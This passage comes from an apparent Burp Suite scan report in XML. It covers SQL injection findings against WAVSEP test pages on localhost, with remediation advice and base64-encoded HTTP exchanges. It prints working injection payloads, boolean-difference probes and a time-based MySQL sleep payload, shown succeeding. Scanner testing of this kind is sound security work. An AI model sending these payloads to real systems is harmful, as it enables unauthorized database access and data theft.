      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTEwLUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1OdW1lcmljLUJpbmFyeURlbGliZXJhdGVSdW50aW1lRXJyb3ItV2l0aEVycm9ycy5qc3A/b3JkZXJieT0xJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NDowOCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsmIzM5OyBhdCBsaW5lIDE8L3A+PHA+PGI+RGVzY3JpcHRpb248L2I+IFRoZSBzZXJ2ZXIgZW5jb3VudGVyZWQgYW4gdW5leHBlY3RlZCBjb25kaXRpb24gdGhhdCBwcmV2ZW50ZWQgaXQgZnJvbSBmdWxmaWxsaW5nIHRoZSByZXF1ZXN0LjwvcD48aHIgY2xhc3M9ImxpbmUiIC8+PGgzPkFwYWNoZSBUb21jYXQvOC41Ljg0PC9oMz48L2JvZHk+PC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTEwLUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1OdW1lcmljLUJpbmFyeURlbGliZXJhdGVSdW50aW1lRXJyb3ItV2l0aEVycm9ycy5qc3A/b3JkZXJieT0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjI5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MzANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEwIC0gSW5qZWN0aW9uIGludG8gYW4gb3JkZXIgYnkgY2xhdXNlIChudW1lcmljKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1331144814762388480</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>91005567 or 8670=08670</b> and <b>63279285 or 5325=5330</b> were each submitted in the transactionDate parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionDate parameter. The application took <b>20012</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcD90cmFuc2FjdGlvbkRhdGU9MjAxMC0wMi0wMjkxMDA1NTY3JTIwb3IlMjA4NjcwJTNkMDg2NzAgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ2OjQ4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAxMjYyDQoNCgoKCjwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgSFRNTCA0LjAxIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi9odG1sNC9sb29zZS5kdGQiPgo8aHRtbD4KPGhlYWQ+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PUlTTy04ODU5LTEiPgo8dGl0bGU+Q2FzZSAxNSAtIEluamVjdGlvbiBpbnRvIGRhdGUgdmFsdWVzICh3aXRob3V0IHF1b3RlcykgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxMzMKPC9URD4KPFREPgoxMjAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KMTM1CjwvVEQ+CjxURD4KMzAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjIyMwo8L1REPgo8VEQ+CjQwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo0MjMKPC9URD4KPFREPgo1MDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KNDU2CjwvVEQ+CjxURD4KNjAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+Cjc4OQo8L1REPgo8VEQ+CjcwMTIKPC9URD4KPFREPgpFeHBlbnNpdmUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo4OTUKPC9URD4KPFREPgo4MDAwCjwvVEQ+CjxURD4KSGVsbG8gV29ybGQKPC9URD4KPFREPgoyMDEwLTAyLTAyCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcD90cmFuc2FjdGlvbkRhdGU9MjAxMC0wMi0wMjYzMjc5Mjg1JTIwb3IlMjA1MzI1JTNkNTMzMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ2OjQ4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE1IC0gSW5qZWN0aW9uIGludG8gZGF0ZSB2YWx1ZXMgKHdpdGhvdXQgcXVvdGVzKSBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcD90cmFuc2FjdGlvbkRhdGU9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjQ4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE1IC0gSW5qZWN0aW9uIGludG8gZGF0ZSB2YWx1ZXMgKHdpdGhvdXQgcXVvdGVzKSBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2840835918918035456</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
